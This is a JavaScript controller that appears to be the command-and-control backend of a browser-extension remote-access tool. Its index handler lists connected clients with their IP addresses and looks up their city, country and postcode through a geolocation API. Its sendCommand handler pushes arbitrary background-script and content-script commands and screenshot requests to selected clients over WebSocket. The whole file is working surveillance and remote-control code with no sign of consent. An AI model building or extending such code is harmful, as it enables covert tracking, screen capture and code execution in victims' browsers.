import {CLIENTS} from "../ws_server.js";

class ClientController {
    async index(req, res, _next) {
        let processedClients = CLIENTS.map((client) => ({
            uid: client.userId,
            ip: client._socket.remoteAddress,
            address: {}
        }))

        // TODO: add batching of 50 clients to get IPs
        const clientIps = processedClients.map((client)=> client.ip)
        if (clientIps.length === 0) {
            return res.json(processedClients)
        }

        try {
            const res = await fetch(`http://api.ipstack.com/${clientIps.join(',')}?access_key=${process.env.IPSTACK_API_KEY}`)
            const data = await res.json()

            if (Array.isArray(data)) {
                data.forEach((client) => {
                    let localClient = processedClients.find((c) => c.ip === client.ip)
                    localClient.address = {
                        city: client.city,
                        country: client.country_name,
                        postCode: client.zip
                    }
                })
            } else {
                let localClient = processedClients.find((c) => c.ip === data.ip)
                localClient.address = {
                    city: data.city,
                    country: data.country_name,
                    postCode: data.zip
                }
            }
        } catch (err) {
            console.error(err.message);
        }

        return res.json(processedClients)
    }

    async sendCommand(req, res, _next) {
        if (!req.body.type.includes('SCREENSHOT') && !req.body.command) {
            res.status(400).send('Bad request')
            return
        }

        const message = {
            data: req.body.command,
            type: [],
        }

        if (req.body.type.includes('SCREENSHOT')) {
            message.type.push('SCREENSHOT')
        }
        if (req.body.type.includes('BACKGROUND')) {
            message.type.push('BG_COMMAND')
        }
        if (req.body.type.includes('CONTENT-SCRIPT')) {
            message.type.push('CS_COMMAND')
        }

        const jsonMessage = JSON.stringify(message)

        const clients = CLIENTS.filter((client) => req.body.clients.includes(client.userId))

        clients.forEach(client => {
            console.log('Sending command to client: ', client.userId)
            client.send(jsonMessage)
        })
        res.status(200).send('Command sent')
    }
}

export default new ClientController();
